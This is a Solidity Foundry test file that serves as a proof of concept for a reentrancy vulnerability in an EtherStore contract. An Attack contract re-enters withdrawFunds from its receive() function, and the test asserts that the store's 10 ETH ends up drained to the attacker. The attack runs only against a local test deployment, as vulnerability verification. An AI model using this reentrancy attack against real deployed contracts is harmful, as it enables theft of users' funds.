// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherstore.sol";

contract Attack {
    EtherStore public etherStore;
    uint256 public attackCount = 10;

    constructor(address _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    receive() external payable {
        if (attackCount > 0) {
            attackCount--;
            etherStore.withdrawFunds(1 ether);
        }
    }

    function attackInit() public payable {
        etherStore.depositFunds{value: 1 ether}();
        etherStore.withdrawFunds(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract EtherStoreReentrancyTest is Test {
    EtherStore public etherStore;
    Attack public attacker;
    address public victim = makeAddr("victim");

    function setUp() public {
        etherStore = new EtherStore();
        
        // Victim deposits 10 ETH into EtherStore
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        etherStore.depositFunds{value: 10 ether}();
        
        // Deploy attacker contract
        attacker = new Attack(address(etherStore));
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyExploit() public {
        // Advance beyond 1 week cooldown period
        vm.warp(1 weeks + 1 days);

        uint256 initialContractBalance = address(etherStore).balance;
        uint256 initialAttackerBalance = address(attacker).balance;

        // Print pre-attack states
        console.log("--- BEFORE-Trigger Attack ---");
        console.log("EtherStore contract initial balance:", initialContractBalance);
        console.log("Attacker contract initial balance:", initialAttackerBalance);

        console.log("--- Trigger AttackInit ---");
        // Execute attack
        attacker.attackInit();

        // Get post-attack states
        uint256 afterContractBalance = address(etherStore).balance;
        uint256 afterAttackerBalance = address(attacker).balance;

        // Print post-attack states
        console.log("--- AFTER-Trigger Attack ---");
        console.log("EtherStore contract final balance:", afterContractBalance);
        console.log("Attacker contract final balance:", afterAttackerBalance);

        // Calculate balance changes
        uint256 contractBalanceChange = initialContractBalance - afterContractBalance;
        uint256 attackerBalanceChange = afterAttackerBalance - initialAttackerBalance;

        console.log("Contract balance decreased by:", contractBalanceChange);
        console.log("Attacker balance increased by:", attackerBalanceChange);

        // Check if vulnerability was exploited
        bool contractDrained = afterContractBalance == 0;
        bool attackerGains = afterAttackerBalance == 11 ether;
        
        if (contractDrained && attackerGains) {
            console.log("Vulnerability Exists: Reentrancy attack drained contract funds to attacker");
        } else {
            console.log("Vulnerability not Exist: Reentrancy exploitation failed");
        }

        // Additional verifications
        assertEq(
            address(etherStore).balance,
            0,
            "Contract should be drained"
        );
        assertEq(
            address(attacker).balance,
            11 ether,
            "Attacker should have stolen all ETH"
        );
    }
}